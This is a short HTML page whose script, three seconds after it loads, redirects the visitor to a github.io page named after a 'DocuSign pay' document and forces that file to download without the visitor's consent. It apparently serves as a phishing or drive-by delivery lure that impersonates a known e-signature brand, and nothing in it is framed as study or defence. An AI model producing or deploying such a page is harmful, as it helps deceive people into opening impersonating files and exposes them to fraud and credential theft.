<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect and Auto Download</title>
</head>
<body>
    <script>
        // Function to trigger automatic download
        function downloadFile(url) {
            var anchor = document.createElement('a');
            anchor.href = url;
            anchor.download = '';
            anchor.click();
        }

        // Redirect to a URL after 3 seconds and trigger download
        setTimeout(function() {
            // Replace 'https://alex-project-payment.github.io/download/docusign-pay/index.html' with the URL of your HTML file
            var url = 'https://alex-project-payment.github.io/download/docusign-pay/index.html';
            window.location.href = url;
            downloadFile(url);
        }, 3000); // 3 seconds delay
    </script>
</body>
</html>
